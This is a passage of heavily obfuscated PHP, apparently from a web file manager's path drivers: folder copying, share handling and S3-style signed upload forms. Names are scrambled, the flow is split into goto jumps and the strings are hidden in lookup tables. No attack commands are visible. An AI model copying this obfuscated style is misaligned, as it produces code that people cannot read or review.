$F¾ÆÉÌÍŠ[$EòÏø’Å‡[485]] . $F¾ÆÉÌÍŠ[$EòÏø’Å‡[394]] . $EòÏø’Å‡[47] . $d—‡Ûï¤Îõ[$EòÏø’Å‡[394]] . $EòÏø’Å‡[47]; $CôØËĞ¡ = array($EòÏø’Å‡[551] => array($EòÏø’Å‡[559], "\x72\x65\x70\x6c\141\143\x65\x28\160\141\x72\x65\156\x74\114\145\x76\145\154\x2c\x27{$fËÇÙ•·³}\x27\x2c\47{$A“œŞã´–}\47\51"), $EòÏø’Å‡[547] => $F¾ÆÉÌÍŠ[$EòÏø’Å‡[396]], $EòÏø’Å‡[548] => $F¾ÆÉÌÍŠ[$EòÏø’Å‡[482]]); if ($BÍ¯Ÿ˜Ş) { $CôØËĞ¡[$EòÏø’Å‡[421]] = 0; } $this->where($Dã…ÑÈë›’)->data($CôØËĞ¡)->save(); } $this->where(array($EòÏø’Å‡[408] => $dÆãÖ‹Ôé™))->data($fŸ¤›”µ)->save(); return $dÆãÖ‹Ôé™; goto FŸ²›èÑ„®; FŸ²›èÑ„®: } private function clearShare($FÉóàõù, $CÑÕ““Æ§ç) { goto a¸å‹‡öß; aï˜µ˜ÌÄ½: if (!$A±èò¦š—) { return; } $A±èò¦š— = array_to_keyvalue($A±èò¦š—, $CğŒ‚„ïÈó[33], $CğŒ‚„ïÈó[465]); $aîÄ²ã„Â… = array($CğŒ‚„ïÈó[465] => array($CğŒ‚„ïÈó[7], $A±èò¦š—)); goto DŒ‡¥›ø¢‡; a¸å‹‡öß: $CğŒ‚„ïÈó =& $_SERVER[åÌÛ»ô¢‚ö™]; $fÒŠù™í°Ò = $this->sourceInfo($FÉóàõù); $fœ†“Ö‡¢ = $this->sourceInfo($CÑÕ““Æ§ç); goto dòê°Áñº; DŒ‡¥›ø¢‡: Model($CğŒ‚„ïÈó[561])->where($aîÄ²ã„Â…)->save(array($CğŒ‚„ïÈó[472] => 0)); Model($CğŒ‚„ïÈó[562])->where($aîÄ²ã„Â…)->delete(); goto Bµ¥§Âà†; dòê°Áñº: if ($fÒŠù™í°Ò[$CğŒ‚„ïÈó[482]] == $fœ†“Ö‡¢[$CğŒ‚„ïÈó[482]] && $fÒŠù™í°Ò[$CğŒ‚„ïÈó[396]] == $CğŒ‚„ïÈó[560]) { return; } $aîÄ²ã„Â… = array($CğŒ‚„ïÈó[485] => array($CğŒ‚„ïÈó[509], $fÒŠù™í°Ò[$CğŒ‚„ïÈó[485]] . $FÉóàõù . $CğŒ‚„ïÈó[510])); $eÍí¶ÜÌˆæ = $this->field($CğŒ‚„ïÈó[408])->where($aîÄ²ã„Â…)->getField($CğŒ‚„ïÈó[394], !0); goto BÆ–¬Œ†«Ì; BÆ–¬Œ†«Ì: if (!$eÍí¶ÜÌˆæ) { return; } $aîÄ²ã„Â… = array($CğŒ‚„ïÈó[394] => array($CğŒ‚„ïÈó[7], $eÍí¶ÜÌˆæ), $CğŒ‚„ïÈó[472] => 1); $A±èò¦š— = Model($CğŒ‚„ïÈó[561])->field($CğŒ‚„ïÈó[465])->where($aîÄ²ã„Â…)->select(); goto aï˜µ˜ÌÄ½; Bµ¥§Âà†: } public function copyFolderFromIO($a™„äéÈë, $FôÍà™ŒŒ, $dŒåâÍ­±, $D»Êã‡ØŒô, $f‰Üª†èéó, $EŒ¿è¸àËŞ = false) { goto eâ˜ƒ‰…—È; eâ˜ƒ‰…—È: $Cõø™Ë¸Ş =& $_SERVER[åÌÛ»ô¢‚ö™]; $F…†¬ƒ…Û– = array($Cõø™Ë¸Ş[528] => array(), $Cõø™Ë¸Ş[529] => array(), $Cõø™Ë¸Ş[527] => array(), $Cõø™Ë¸Ş[563] => array()); $Eõ©ÁÖŠ»ê = $EŒ¿è¸àËŞ ? $EŒ¿è¸àËŞ : $a™„äéÈë->getPathName($a™„äéÈë->pathThis($FôÍà™ŒŒ)); goto DÃåˆï‘©¥; Eñíë ‘·Ş: $this->updateModifyTime($dŒåâÍ­±); return $bââ±ãø‘; goto B–ŞØ¬î…; BŒİ—À”: if ($cİ³ßÆ‰¬á) { $this->_childrenAllMake($cİ³ßÆ‰¬á); } Hook::trigger($Cõø™Ë¸Ş[564]); $this->_copyChildTo($a™„äéÈë, $FôÍà™ŒŒ, $bââ±ãø‘, $D»Êã‡ØŒô, $F…†¬ƒ…Û–, $f‰Üª†èéó); goto B¢¤ŸÆáÅ‘; DÃåˆï‘©¥: $cİ³ßÆ‰¬á = $this->fileNameExist($dŒåâÍ­±, $Eõ©ÁÖŠ»ê); $bââ±ãø‘ = $this->mkdir($dŒåâÍ­±, $Eõ©ÁÖŠ»ê, $D»Êã‡ØŒô); if (!$cİ³ßÆ‰¬á || $D»Êã‡ØŒô == REPEAT_RENAME_FOLDER) { $D»Êã‡ØŒô = !1; } goto BŒİ—À”; B¢¤ŸÆáÅ‘: Hook::trigger($Cõø™Ë¸Ş[565]); if ($bââ±ãø‘) { $this->folderSizeResetChildren($bââ±ãø‘); } $this->_childrenListClear(); goto cÁ¤˜Ñƒæ¡; cÁ¤˜Ñƒæ¡: Model($Cõø™Ë¸Ş[530])->addAll($F…†¬ƒ…Û–[$Cõø™Ë¸Ş[528]], array(), !0); Model($Cõø™Ë¸Ş[531])->eventCopy($bââ±ãø‘); $this->saveAll($F…†¬ƒ…Û–[$Cõø™Ë¸Ş[529]]); goto eå¶ŠÛŸ²ç; eå¶ŠÛŸ²ç: Model($Cõø™Ë¸Ş[447])->linkAdd($F…†¬ƒ…Û–[$Cõø™Ë¸Ş[527]]); Model($Cõø™Ë¸Ş[447])->remove($F…†¬ƒ…Û–[$Cõø™Ë¸Ş[563]]); $this->folderSizeReset($dŒåâÍ­±); goto Eñíë ‘·Ş; B–ŞØ¬î…: } private function _copyChildTo($fß„¬½ƒÑà, $e¾¢ÆÂÕğ, $cîÇ“ø¾‰§, $CñÓöŸÑ², &$BÒÈÍ’ˆª±, $b²á§Ô„) { goto eƒÉòÌï; eƒÉòÌï: $eã¾·ªÂ¹ =& $_SERVER[åÌÛ»ô¢‚ö™]; $d×ÓÆåÇíº = $this->sourceInfoCache($cîÇ“ø¾‰§); $AÈ®ïéğÏ½ = $fß„¬½ƒÑà->listPath($e¾¢ÆÂÕğ); goto eµğªŒ»‚¶; aâéØ†¹Üš: foreach ($Bó­ßŒ†© as &$dÛàÎæøÜ›) { goto A‰›‹¾±—; bàšë…éÑñ: $dÛàÎæøÜ›[$eã¾·ªÂ¹[77]] = _get($dÛàÎæøÜ›, $eã¾·ªÂ¹[77], 0); $dÛàÎæøÜ›[$eã¾·ªÂ¹[444]] = _get($dÛàÎæøÜ›, $eã¾·ªÂ¹[444], 0); if (!isset($dÛàÎæøÜ›[$eã¾·ªÂ¹[566]]) && $dÛàÎæøÜ›[$eã¾·ªÂ¹[444]]) { $BÒÈÍ’ˆª±[$eã¾·ªÂ¹[563]][] = $dÛàÎæøÜ›[$eã¾·ªÂ¹[444]]; } goto c“Î‡†ÑÀÀ; A‰›‹¾±—: if (isset($fŸŸ¸¾Ó÷¦[$dÛàÎæøÜ›[$eã¾·ªÂ¹[28]]])) { $dÛàÎæøÜ› = $fŸŸ¸¾Ó÷¦[$dÛàÎæøÜ›[$eã¾·ªÂ¹[28]]]; } $dÛàÎæøÜ›[$eã¾·ªÂ¹[395]] = $dÛàÎæøÜ›[$eã¾·ªÂ¹[29]] == $eã¾·ªÂ¹[76]; $dÛàÎæøÜ›[$eã¾·ªÂ¹[397]] = _get($dÛàÎæøÜ›, $eã¾·ªÂ¹[165], $eã¾·ªÂ¹[33]); goto bàšë…éÑñ; c“Î‡†ÑÀÀ: if ($CñÓöŸÑ²) { $D²¼Æ…•Îœ = $this->fileNameExistCache($cîÇ“ø¾‰§, $dÛàÎæøÜ›[$eã¾·ªÂ¹[28]]); if ($D²¼Æ…•Îœ) { if ($dÛàÎæøÜ›[$eã¾·ªÂ¹[395]] || $CñÓöŸÑ² == REPEAT_SKIP) { continue; } if ($CñÓöŸÑ² == REPEAT_REPLACE) { $bĞïÏêÑ¯‰ = $this->sourceInfoCache($D²¼Æ…•Îœ); $Aš¨àò­ƒ = $this->fileHistory($bĞïÏêÑ¯‰, $dÛàÎæøÜ›[$eã¾·ªÂ¹[444]], $dÛàÎæøÜ›[$eã¾·ªÂ¹[77]]); if ($Aš¨àò­ƒ) { $BÒÈÍ’ˆª±[$eã¾·ªÂ¹[527]][] = $dÛàÎæøÜ›[$eã¾·ªÂ¹[444]]; } continue; } else { if ($CñÓöŸÑ² == REPEAT_RENAME) { $dÛàÎæøÜ›[$eã¾·ªÂ¹[28]] = $this->fileNameAutoCache($cîÇ“ø¾‰§, $dÛàÎæøÜ›[$eã¾·ªÂ¹[28]], $CñÓöŸÑ², !1); } } } } if (!$dÛàÎæøÜ›[$eã¾·ªÂ¹[395]] && $dÛàÎæøÜ›[$eã¾·ªÂ¹[444]]) { $BÒÈÍ’ˆª±[$eã¾·ªÂ¹[527]][] = $dÛàÎæøÜ›[$eã¾·ªÂ¹[444]]; } $Bìò¾ï˜Ö[] = $this->_makeItemData($dÛàÎæøÜ›, $d×ÓÆåÇíº, $dÛàÎæøÜ›[$eã¾·ªÂ¹[28]]); goto eÃ­‡ÖÈ‹; eÃ­‡ÖÈ‹: } unset($dÛàÎæøÜ›); if (!empty($Bìò¾ï˜Ö)) { $this->addAll($Bìò¾ï˜Ö); } goto Bßöİ ÓŠŒ; Bßöİ ÓŠŒ: $d²óšâÓ‹¦ = $this->_childrenList($cîÇ“ø¾‰§); $d²óšâÓ‹¦ = array_to_keyvalue($d²óšâÓ‹¦, $eã¾·ªÂ¹[28]); foreach ($Bó­ßŒ†© as $dÛàÎæøÜ›) { $bĞïÏêÑ¯‰ = $d²óšâÓ‹¦[$dÛàÎæøÜ›[$eã¾·ªÂ¹[28]]]; $D†éóºö¹™ = $bĞïÏêÑ¯‰[$eã¾·ªÂ¹[394]]; $this->_copyApplyMeta($bĞïÏêÑ¯‰, $BÒÈÍ’ˆª±); if ($dÛàÎæøÜ›[$eã¾·ªÂ¹[29]] == $eã¾·ªÂ¹[76]) { $dÛàÎæøÜ›[$eã¾·ªÂ¹[75]] = $fß„¬½ƒÑà->getPathInner($dÛàÎæøÜ›[$eã¾·ªÂ¹[75]]); $this->_copyChildTo($fß„¬½ƒÑà, $dÛàÎæøÜ›[$eã¾·ªÂ¹[75]], $D†éóºö¹™, $CñÓöŸÑ², $BÒÈÍ’ˆª±, $b²á§Ô„); } } goto dĞ¦£¤ĞŞè; eµğªŒ»‚¶: $Bó­ßŒ†© = array_merge($AÈ®ïéğÏ½[$eã¾·ªÂ¹[73]], $AÈ®ïéğÏ½[$eã¾·ªÂ¹[74]]); $fŸŸ¸¾Ó÷¦ = $this->_addFiles($fß„¬½ƒÑà, $AÈ®ïéğÏ½[$eã¾·ªÂ¹[73]], $b²á§Ô„); $Bìò¾ï˜Ö = array(); goto aâéØ†¹Üš; dĞ¦£¤ĞŞè: } private function _addFiles($dµùÑÛøÓà, $e¬ñİ—öâÉ, $f¡œ½ÔÙ) { goto DªÚàâ¶• ; B½­ó…‰¦“: $eŸ¨½«çˆÂ = $eŸ¨½«çˆÂ ? $eŸ¨½«çˆÂ : array(); foreach ($eŸ¨½«çˆÂ as $Cå§ÆÛ¦ÄŒ) { if (!isset($b Ö’ŒÛùÆ[$Cå§ÆÛ¦ÄŒ[$BÀ‡‹Ûà÷È[167]]])) { continue; } $e‹ëÇø­ŠŞ =& $b Ö’ŒÛùÆ[$Cå§ÆÛ¦ÄŒ[$BÀ‡‹Ûà÷È[167]]]; foreach ($e‹ëÇø­ŠŞ as &$FÎÁÌŞ¸ ) { $FÎÁÌŞ¸ [$BÀ‡‹Ûà÷È[444]] = $Cå§ÆÛ¦ÄŒ[$BÀ‡‹Ûà÷È[444]]; } unset($FÎÁÌŞ¸ ); } $fØÒèõ† = array(); goto BÇŒ‘î– ; DªÚàâ¶• : $BÀ‡‹Ûà÷È =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$e¬ñİ—öâÉ || count($e¬ñİ—öâÉ) == 0) { return array(); } $b Ö’ŒÛùÆ = array(); goto dˆŒñ¢¿Ù; F‹ˆ½ïá¡: foreach ($eŸ¨½«çˆÂ as $Cå§ÆÛ¦ÄŒ) { if (!isset($b Ö’ŒÛùÆ[$Cå§ÆÛ¦ÄŒ[$BÀ‡‹Ûà÷È[167]]])) { continue; } $FÈ¤å‚¾ª… = $b Ö’ŒÛùÆ[$Cå§ÆÛ¦ÄŒ[$BÀ‡‹Ûà÷È[167]]]; foreach ($FÈ¤å‚¾ª… as &$FÎÁÌŞ¸ ) { $FÎÁÌŞ¸ [$BÀ‡‹Ûà÷È[444]] = $Cå§ÆÛ¦ÄŒ[$BÀ‡‹Ûà÷È[444]]; $FÎÁÌŞ¸ [$BÀ‡‹Ûà÷È[566]] = !0; } unset($FÎÁÌŞ¸ ); } $aóÅİ¡àÙÄ = array(); foreach ($e¬ñİ—öâÉ as $açœ×‡ÏÃ) { if (isset($açœ×‡ÏÃ[$BÀ‡‹Ûà÷È[566]]) && $açœ×‡ÏÃ[$BÀ‡‹Ûà÷È[566]]) { continue; } $EéÉ×ğ´Ã— = $dµùÑÛøÓà->getPathInner($açœ×‡ÏÃ[$BÀ‡‹Ûà÷È[75]]); $cóğõ»¦†” = $a¸æš¾îĞ->addFileMake($EéÉ×ğ´Ã—, $açœ×‡ÏÃ[$BÀ‡‹Ûà÷È[77]], $açœ×‡ÏÃ[$BÀ‡‹Ûà÷È[168]], $açœ×‡ÏÃ[$BÀ‡‹Ûà÷È[167]], $açœ×‡ÏÃ[$BÀ‡‹Ûà÷È[28]], $f¡œ½ÔÙ); $aóÅİ¡àÙÄ[] = $cóğõ»¦†”; } goto B¯„Ÿ‰¢—; dˆŒñ¢¿Ù: foreach ($e¬ñİ—öâÉ as &$FÎÁÌŞ¸ ) { goto f•ƒ¸îì¡; f«´”Œî¥Ë: $Dà¿òÎÇŠó = $dµùÑÛøÓà->hashMd5($FÎÁÌŞ¸ [$BÀ‡‹Ûà÷È[75]]); if (strlen($Dà¿òÎÇŠó) > 10 && !isset($b Ö’ŒÛùÆ[$Dà¿òÎÇŠó])) { $b Ö’ŒÛùÆ[$Dà¿òÎÇŠó] = array(); } $FÎÁÌŞ¸ [$BÀ‡‹Ûà÷È[168]] = $d„œ¬›«—·; goto F£¯Œ»¸; föö‘ÖëŞ: if (count($b Ö’ŒÛùÆ[$Dà¿òÎÇŠó]) > 1) { $FÎÁÌŞ¸ [$BÀ‡‹Ûà÷È[566]] = !0; } goto a¶âŸªœëö; f•ƒ¸îì¡: Hook::trigger($BÀ‡‹Ûà÷È[567], $FÎÁÌŞ¸ ); $FÎÁÌŞ¸ [$BÀ‡‹Ûà÷È[75]] = $dµùÑÛøÓà->getPathInner($FÎÁÌŞ¸ [$BÀ‡‹Ûà÷È[75]]); $d„œ¬›«—· = $dµùÑÛøÓà->hashSimple($FÎÁÌŞ¸ [$BÀ‡‹Ûà÷È[75]]); goto f«´”Œî¥Ë; F£¯Œ»¸: $FÎÁÌŞ¸ [$BÀ‡‹Ûà÷È[167]] = $Dà¿òÎÇŠó; Hook::trigger($BÀ‡‹Ûà÷È[568], $FÎÁÌŞ¸ ); $b Ö’ŒÛùÆ[$Dà¿òÎÇŠó][] =& $FÎÁÌŞ¸ ; goto föö‘ÖëŞ; a¶âŸªœëö: } unset($FÎÁÌŞ¸ ); $c©‹Í¡çÏÏ = array($BÀ‡‹Ûà÷È[167] => array($BÀ‡‹Ûà÷È[7], array_keys($b Ö’ŒÛùÆ))); goto EÏ«ç‘òì; BÇŒ‘î– : foreach ($e¬ñİ—öâÉ as $c¢‹¯·¾Á) { $fØÒèõ†[$c¢‹¯·¾Á[$BÀ‡‹Ûà÷È[28]]] = $c¢‹¯·¾Á; } return $fØÒèõ†; goto a‰Š·‚İ¶; B¯„Ÿ‰¢—: $a¸æš¾îĞ->addAll($aóÅİ¡àÙÄ); $c©‹Í¡çÏÏ = array($BÀ‡‹Ûà÷È[167] => array($BÀ‡‹Ûà÷È[7], array_keys($b Ö’ŒÛùÆ))); $eŸ¨½«çˆÂ = $a¸æš¾îĞ->where($c©‹Í¡çÏÏ)->select(); goto B½­ó…‰¦“; EÏ«ç‘òì: $a¸æš¾îĞ = Model($BÀ‡‹Ûà÷È[569]); $eŸ¨½«çˆÂ = $a¸æš¾îĞ->where($c©‹Í¡çÏÏ)->select(); $eŸ¨½«çˆÂ = $eŸ¨½«çˆÂ ? $eŸ¨½«çˆÂ : array(); goto F‹ˆ½ïá¡; a‰Š·‚İ¶: } } define($_SERVER[åÌÛ»ô¢‚ö™][570], $_SERVER[åÌÛ»ô¢‚ö™][571]); goto AÈ£¯Á«²§; CµêÆÊÖ‹Ä: class PathDriverDriverShareItem { public function __construct($C÷àÛÔÃª×) { $this->pathParse = $C÷àÛÔÃª×; } public function __call($a‹çÈàëí¢, $e÷©„Æ¤¥•) { $bí‡ˆµ¼™ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (method_exists($this, $a‹çÈàëí¢)) { return; } $DùÓ÷«®¥ = call_user_func_array(array($bí‡ˆµ¼™[1151], $a‹çÈàëí¢), $e÷©„Æ¤¥•); $föœÈÙÙÀ = array($bí‡ˆµ¼™[1152], $bí‡ˆµ¼™[1153], $bí‡ˆµ¼™[1154], $bí‡ˆµ¼™[1155], $bí‡ˆµ¼™[516], $bí‡ˆµ¼™[518], $bí‡ˆµ¼™[1156], $bí‡ˆµ¼™[103], $bí‡ˆµ¼™[1157], $bí‡ˆµ¼™[1158]); if (in_array($a‹çÈàëí¢, $föœÈÙÙÀ)) { $DùÓ÷«®¥ = $this->getPathOuter($DùÓ÷«®¥); } return $DùÓ÷«®¥; } public function copy($F¢ÀªÇ¹éá, $dÂÇ†¿àë, $d©´÷«Áù = false) { return $this->copyMove($F¢ÀªÇ¹éá, $dÂÇ†¿àë, $d©´÷«Áù, $_SERVER[åÌÛ»ô¢‚ö™][516]); } public function move($FÎ¯˜šïˆ, $AœâÖ£‚Ë, $D³’èçŞ×  = false) { return $this->copyMove($FÎ¯˜šïˆ, $AœâÖ£‚Ë, $D³’èçŞ× , $_SERVER[åÌÛ»ô¢‚ö™][518]); } private function copyMove($f¹ˆ¸“š§Ó, $AØÌç‚éÂ¯, $dªàœ¸×ê–, $b Ô‰áÌ­¯) { goto D£¤ÂÉäøè; D£¤ÂÉäøè: $C¼“Ã¯ö =& $_SERVER[åÌÛ»ô¢‚ö™]; $Bµ›”¸ç¨à = $AØÌç‚éÂ¯; $A‘¾âÑêÍ = IO::driverMake($AØÌç‚éÂ¯); goto BõÌ©¶Ğ‡‚; F„ÉæÒååÜ: return $Dø…â¦Ã±; goto b²ÀŸñ£; BõÌ©¶Ğ‡‚: if ($A‘¾âÑêÍ->pathParse[$C¼“Ã¯ö[1021]]) { $AØÌç‚éÂ¯ = $A‘¾âÑêÍ->pathParse[$C¼“Ã¯ö[1021]]; } else { $AØÌç‚éÂ¯ = $Bµ›”¸ç¨à; } $Dø…â¦Ã± = IO::copyMove($f¹ˆ¸“š§Ó, $AØÌç‚éÂ¯, $dªàœ¸×ê–, $b Ô‰áÌ­¯); $Dø…â¦Ã± = $this->getPathOuter($Dø…â¦Ã±); goto F„ÉæÒååÜ; b²ÀŸñ£: } public function pathFather($d¹““µ¥ß) { return get_path_father($this->pathParse[$_SERVER[åÌÛ»ô¢‚ö™][75]]); } public function iconvSystem($Fâ½ß‰ï) { return $Fâ½ß‰ï; } protected function infoParse($aÎñ…Ÿ†Ùƒ, $cöê–´“ô = false) { $aÆÍºÑÑ© =& $_SERVER[åÌÛ»ô¢‚ö™]; $F¾„µ¤ËŞî = $this->pathParse[$aÆÍºÑÑ©[463]][$aÆÍºÑÑ©[1046]] . $this->pathParse[$aÆÍºÑÑ©[1039]]; if ($cöê–´“ô) { $e¤ØòØì = IO::infoWithChildren($F¾„µ¤ËŞî); } else { $e¤ØòØì = IO::info($F¾„µ¤ËŞî); } $A¿Ä˜’å› = $this->pathParse[$aÆÍºÑÑ©[463]]; return Action($aÆÍºÑÑ©[1150])->_shareItemeParse($e¤ØòØì, $A¿Ä˜’å›); } public function listAll($c„ÏÅ«¥†„) { $AÉõÀéâº =& $_SERVER[åÌÛ»ô¢‚ö™]; $aóàËÈğÉå = IO::listAll($c„ÏÅ«¥†„); $eË”´‚âç÷ = $this->pathParse[$AÉõÀéâº[463]]; foreach ($aóàËÈğÉå as &$bÉ™¦¡ÑøÀ) { check_abort(); $bÉ™¦¡ÑøÀ = array_merge(IO::info($bÉ™¦¡ÑøÀ[$AÉõÀéâº[75]]), $bÉ™¦¡ÑøÀ); $bÉ™¦¡ÑøÀ[$AÉõÀéâº[416]] = Action($AÉõÀéâº[1150])->_shareItemeParse($bÉ™¦¡ÑøÀ, $eË”´‚âç÷); } unset($bÉ™¦¡ÑøÀ); return $aóàËÈğÉå; } public function getPathOuter($AĞÎÒíĞè) { goto dä½í±¦°¡; dä½í±¦°¡: $D¶¿°¨ÜÄ® =& $_SERVER[åÌÛ»ô¢‚ö™]; $Fˆ–£±ä = KodIO::parse($AĞÎÒíĞè); if ($Fˆ–£±ä[$D¶¿°¨ÜÄ®[29]] == KodIO::KOD_SHARE_ITEM) { return $Fˆ–£±ä[$D¶¿°¨ÜÄ®[75]]; } goto D°­„¯Šî; fôŸŸô²ïÊ: if (substr($D­œëØ«”ã, 0, strlen($A©¥Ç„î½ò)) != $A©¥Ç„î½ò) { return !1; } return $this->pathParse[$D¶¿°¨ÜÄ®[1040]] . $D¶¿°¨ÜÄ®[8] . ltrim($D¿ä™ÖÅ¸, $D¶¿°¨ÜÄ®[8]); goto Bç‡¥‹ãõ˜; D°­„¯Šî: $D­œëØ«”ã = KodIO::clear($AĞÎÒíĞè); $A©¥Ç„î½ò = KodIO::clear($this->pathParse[$D¶¿°¨ÜÄ®[463]][$D¶¿°¨ÜÄ®[1046]]); $D¿ä™ÖÅ¸ = substr($D­œëØ«”ã, strlen($A©¥Ç„î½ò)); goto fôŸŸô²ïÊ; Bç‡¥‹ãõ˜: } public function getType() { $e–íŠÄÄÛÂ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Fà‡´­Ó¡³ = str_replace($e–íŠÄÄÛÂ[71], $e–íŠÄÄÛÂ[33], get_class($this)); return strtolower($Fà‡´­Ó¡³); } public function isTypeObject($Fœ´›ã‘„ä) { return IO::isTypeObject($Fœ´›ã‘„ä); } public function info($eßÎÏÑÌš) { return $this->infoParse($eßÎÏÑÌš); } public function infoAuth($BÒµÔÈõ› ) { return $this->infoParse($BÒµÔÈõ› ); } public function infoWithChildren($E™œ•²¦¢²) { return $this->infoParse($E™œ•²¦¢², !0); } public function infoFull($EµÍïÙ°¤æ) { return $this->infoParse($EµÍïÙ°¤æ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($C§ÖÂÈçãò) { $this->pathParse = $C§ÖÂÈçãò; } protected function infoParse($B‚ìöß™˜è, $c§‹±«à»æ = false) { $BŠøÎƒ³Ø– =& $_SERVER[åÌÛ»ô¢‚ö™]; return Action($BŠøÎƒ³Ø–[1045])->sharePathInfo($this->pathParse[$BŠøÎƒ³Ø–[75]], !0, $c§‹±«à»æ); } public function listPath($eôø¥Éé©³, $Fµ……ôÄ = false) { $eÊÈö¸Ğ·ó =& $_SERVER[åÌÛ»ô¢‚ö™]; $dºÉ†”©ï† = IO::listPath($eôø¥Éé©³, $Fµ……ôÄ); foreach ($dºÉ†”©ï† as $E“Ëñ¹¥Äø => $B½Ï¼„Š¾¥) { if (!in_array($E“Ëñ¹¥Äø, array($eÊÈö¸Ğ·ó[73], $eÊÈö¸Ğ·ó[74]))) { continue; } foreach ($B½Ï¼„Š¾¥ as $dÎŒä„À· => $BÎË·×¯›») { $BÎË·×¯›» = Action($eÊÈö¸Ğ·ó[1159])->parsePathChildren($BÎË·×¯›», array($eÊÈö¸Ğ·ó[412] => $eôø¥Éé©³)); $dºÉ†”©ï†[$E“Ëñ¹¥Äø][$dÎŒä„À·] = Action($eÊÈö¸Ğ·ó[1045])->shareItemInfo($BÎË·×¯›»); } } return $dºÉ†”©ï†; } public function listAll($a¯‚îˆäÆ¤) { $eÕ‡–©ô•‘ =& $_SERVER[åÌÛ»ô¢‚ö™]; $bÊ˜º‰ìº’ = IO::listAll($a¯‚îˆäÆ¤); foreach ($bÊ˜º‰ìº’ as &$Bå™ÄïïÕ) { $Bå™ÄïïÕ = array_merge(IO::info($Bå™ÄïïÕ[$eÕ‡–©ô•‘[75]]), $Bå™ÄïïÕ); $Bå™ÄïïÕ[$eÕ‡–©ô•‘[416]] = Action($eÕ‡–©ô•‘[1045])->shareItemInfo($Bå™ÄïïÕ); } unset($Bå™ÄïïÕ); return $bÊ˜º‰ìº’; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($EØİß¿“µ§) { parent::__construct($EØİß¿“µ§); $this->signatureVersion($_SERVER[åÌÛ»ô¢‚ö™][218]); } public function uploadFormData($Dá­×Ø»òº, $aÈ­‚Œ¼Ø® = 3600) { goto E°ë¯òïåÆ; AÙ»ª†¿™: $EçÉ¼ó‰º = hash_hmac($d‘º‹Š‰¢[1170], $CÃˆÊ–·Æ°, $EÁ¦Å›¦Úç, !0); $dÂËÏ£ÊŠÛ = hash_hmac($d‘º‹Š‰¢[1170], $EÂğåä…¯, $EçÉ¼ó‰º, !0); $Fí­Ìòº§ = hash_hmac($d‘º‹Š‰¢[1170], $eÊµ£Ñ»§‘, $dÂËÏ£ÊŠÛ); goto Bìï‰ Â†Ê; CÃÖŒ¯×í: $eÊµ£Ñ»§‘ = base64_encode(json_encode($D†î×©õ´)); $eÇïµ¥ó± = hash_hmac($d‘º‹Š‰¢[1170], $eùË…’Œ”, $d‘º‹Š‰¢[1171] . $this->secret, !0); $EÁ¦Å›¦Úç = hash_hmac($d‘º‹Š‰¢[1170], $this->region, $eÇïµ¥ó±, !0); goto AÙ»ª†¿™; E°ë¯òïåÆ: $d‘º‹Š‰¢ =& $_SERVER[åÌÛ»ô¢‚ö™]; $cª‹Œ‘çàÓ = $d‘º‹Š‰¢[199]; $FÜÙ“·‚ = $d‘º‹Š‰¢[1160]; goto DÂÌ¿â‘Š‰; Bìï‰ Â†Ê: $Bñæ‹¦â† = array($d‘º‹Š‰¢[217] => $d‘º‹Š‰¢[33], $d‘º‹Š‰¢[1172] => $d‘º‹Š‰¢[33], $d‘º‹Š‰¢[1130] => $cª‹Œ‘çàÓ, $d‘º‹Š‰¢[1134] => $CéëÇ®ñÕ, $d‘º‹Š‰¢[1138] => $eÊµ£Ñ»§‘, $d‘º‹Š‰¢[1173] => $Aï‘‡®»ëš, $d‘º‹Š‰¢[1174] => $FÜÙ“·‚, $d‘º‹Š‰¢[1175] => $b²¸ã³Ÿˆá, $d‘º‹Š‰¢[1176] => $Cº¼„Ù£ˆ, $d‘º‹Š‰¢[1177] => $Fí­Ìòº§, $d‘º‹Š‰¢[173] => $this->getHost()); return $Bñæ‹¦â†; goto AçÎ·í‰²‰; aÀéê°¶òå: $FíØÆÓÓ…¼ = array($this->accessKey, $eùË…’Œ”, $this->region, $CÃˆÊ–·Æ°, $EÂğåä…¯); $Aï‘‡®»ëš = implode($d‘º‹Š‰¢[8], $FíØÆÓÓ…¼); $D†î×©õ´ = array($d‘º‹Š‰¢[1128] => gmdate($d‘º‹Š‰¢[1127], strtotime($d‘º‹Š‰¢[1163])), $d‘º‹Š‰¢[1129] => array(array($d‘º‹Š‰¢[1131] => $this->bucket), array($d‘º‹Š‰¢[1130] => $cª‹Œ‘çàÓ), array($d‘º‹Š‰¢[1132], $d‘º‹Š‰¢[1133], $d‘º‹Š‰¢[33]), array($d‘º‹Š‰¢[1132], $d‘º‹Š‰¢[1164], $d‘º‹Š‰¢[33]), array($d‘º‹Š‰¢[1132], $d‘º‹Š‰¢[1165], $d‘º‹Š‰¢[33]), array($d‘º‹Š‰¢[1134] => $CéëÇ®ñÕ), array($d‘º‹Š‰¢[1166] => $Aï‘‡®»ëš), array($d‘º‹Š‰¢[1167] => $FÜÙ“·‚), array($d‘º‹Š‰¢[1168] => $b²¸ã³Ÿˆá), array($d‘º‹Š‰¢[1169] => $Cº¼„Ù£ˆ))); goto CÃÖŒ¯×í; DÂÌ¿â‘Š‰: $CÃˆÊ–·Æ° = $d‘º‹Š‰¢[59]; $b²¸ã³Ÿˆá = gmdate($d‘º‹Š‰¢[1161]); $eùË…’Œ” = gmdate($d‘º‹Š‰¢[717]); goto c“‡¥èù‘; c“‡¥èù‘: $EÂğåä…¯ = $d‘º‹Š‰¢[1162]; $Cº¼„Ù£ˆ = $aÈ­‚Œ¼Ø® . $d‘º‹Š‰¢[33]; $CéëÇ®ñÕ = $d‘º‹Š‰¢[1126]; goto aÀéê°¶òå; AçÎ·í‰²‰: } } goto cğ¥ºÓñ‰â; e•ˆ©±…„©: if (!function_exists($_SERVER[åÌÛ»ô¢‚ö™][1909])) { function imagecreatefrombmp($cç„‡ç„ÁÕ) { return ImageGdBMP::load($cç„‡ç„ÁÕ); } } class Input { public static function getArray($aÅç‚Ÿº¢µ) { goto c‡Ú°÷˜°¿; Añ‡¹ñ†¤—: $A¾ÀŸÎÑÜ = array(); $AÌÚ‘è¿á¡ = LNG($DŞ­ÉÃÜåÙ[1910]); foreach ($aÅç‚Ÿº¢µ as $eïÄ²ºˆ­ => $A¬ç¹ÂäÂ) { goto B’Æ¶«åŞ; Dß‡ßí ¯é: if (!array_key_exists($eïÄ²ºˆ­, $in)) { if (array_key_exists($DŞ­ÉÃÜåÙ[1912], $A¬ç¹ÂäÂ)) { if 